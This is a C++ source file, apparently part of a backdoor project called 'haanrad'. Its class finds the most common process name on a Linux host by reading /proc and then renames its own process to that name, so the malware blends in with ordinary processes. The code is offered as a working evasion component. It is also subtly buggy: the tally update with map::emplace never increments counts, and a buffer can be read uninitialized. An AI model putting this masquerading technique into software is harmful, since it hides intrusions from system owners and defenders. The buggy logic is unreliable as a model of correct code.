//
// Created by bensoer on 31/10/16.
//

#include <cstring>
#include "ProcessDistorter.h"
#include "../shared/utils/Logger.h"
#include <sys/prctl.h>
#include <vector>
#include <dirent.h>
#include <map>
#include <algorithm>
#include <fstream>
#include <stdlib.h>

ProcessDistorter::ProcessDistorter(char ** argv, bool useDefaultOnFail, bool appendHint) {
    this->argv = argv;
    this->useDefaultOnFail = useDefaultOnFail;
    this->appendHint = appendHint;
}

/**
 * setProcessName sets the process name for the program using the passed in string name
 * @param name String - the new name to set the process to
 */
void ProcessDistorter::setProcessName(string name) {

    if(this->appendHint){
        name = name + "-bd";
    }

    //change up internal variables
    this->previousProcessName = string(argv[0]);
    this->currentProcessName = name;

    //set new name
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], name.c_str());
    prctl(PR_SET_NAME, name.c_str(), 0,0);

    Logger::debug("ProcessDistorter - Process Has Been Renamed To: >" + name + "<");
}

/**
 * determineProcessName filters through all processes and finds the most popular name. Then based on configured settings
 * sets the haanrad system to that new name. Also on failure, handles process rename failures and recovery
 */
void ProcessDistorter::determineProcessName() {

    //find popular process
    string * popularProcessName = this->findPopularProcessName();
    //error check the results
    if(popularProcessName == nullptr){
        Logger::debug("ProcessDistorter - Failed To Determine Popular Process Name");
        //set process to however haanrad has been configured
        if(this->useDefaultOnFail){
            Logger::debug("ProcessDistorer - Reverting To Default Process Name");
            this->setProcessName(this->defaultName);
        }else{
            Logger::debug("ProcessDistorter - Using Current Process Name Again");
        }
    }else{
        Logger::debug("ProcessDistorter - Determined New Process Name. Updating");
        this->setProcessName(*popularProcessName);
    }

    //cleanup
    delete(popularProcessName);
    popularProcessName = nullptr;
}

/**
 * findPopularProcessName searches through the /proc directory to get a tally of all the process names. It then counts
 * all the names and returns the process name with the highest tally. In the event of a draw, findPopularProcessName
 * using a random number genrator to pick one of the processes
 * @return String * - The most popular process name on the system
 */
//TODO: Implement ability to compare processes that only differ by number in names
string * ProcessDistorter::findPopularProcessName() {

    //find all running processes
    Logger::debug("ProcessDistorter - Creating Strctures");
    vector<string> * processDirs = new vector<string>();
    map<string, int> * processes = new map<string, int>();

    Logger::debug("ProcessDistorer - Collecting /proc dirs");
    DIR *dp;
    struct dirent *dirp;
    if((dp = opendir("/proc")) == NULL){
        Logger::debug("ProcessDistortor:findPopularProcessName - Failed To Open Proc Folder. Can't Get Stats");
        return nullptr;
    }

    Logger::debug("ProcessDistorter:findPopularProcessName - Reading Proc Folder Contents. Searching For Process Folders");
    while((dirp = readdir(dp)) != NULL){
        if(dirp->d_type == DT_DIR){

            //check that this dir is to a process
            bool containsCharacters = false;
            for(int i = 0; i < strlen(dirp->d_name); ++i){
                char c = dirp->d_name[i];
                if(c < 48 || c > 57){
                    containsCharacters = true;
                    break;
                }
            }

            if(containsCharacters){
                continue;
            }else{
                processDirs->push_back(string(dirp->d_name));
            }
        }
    }

    Logger::debug("ProcessDistorter - Searching Through Folders. Collecting Tabs On Process Names");
    //now find all of the names
    for_each(processDirs->begin(), processDirs->end(), [this, processes](string processDir){

        ifstream reader;
        string fullPath = "/proc/" + processDir + "/comm";
        char BUFFER[100]; //supposed to be TASK_COMM_LEN but can't find the macro
        reader.open(fullPath.c_str());
        if(reader.is_open()){
            while(!reader.eof()){
                reader >> BUFFER;
            }
        }

        //only do this if the name we found isn't out own
        if(strcmp(BUFFER, this->currentProcessName.c_str())!=0){
            //create tallys of all the names
            map<string, int>::iterator it;
            it = processes->find(BUFFER);

            if(it != processes->end()){
                //this process exists
                int value = it->second;
                value++;
                processes->emplace(pair<string,int>(BUFFER, value));

            }else{
                //this item does not exist
                processes->insert(pair<string, int>(BUFFER, 1));
            }
        }
    });

    Logger::debug("ProcessDistorter - Searching For Most Common Process");
    pair<string,int> mostCommonProcess = pair<string, int>("unknown", 0);
    //now find the highest one
    for_each(processes->begin(), processes->end(), [&mostCommonProcess](pair<string,int> process){

        if(process.second > mostCommonProcess.second){
            mostCommonProcess = process;
        }

        if(process.second == mostCommonProcess.second){
            //take a gamble here and pick one randomly now
            int choose = rand() % 2;
            if(choose){
                mostCommonProcess = process;
            }
        }
    });

    Logger::debug("ProcessDistoter - Cleaning Up");
    processDirs->clear();
    delete(processDirs);
    processDirs = nullptr;
    processes->clear();
    delete(processes);
    processes = nullptr;
    Logger::debug("Most Common Process Found. Returning");
    string * mcp = new string(mostCommonProcess.first);
    return mcp;

}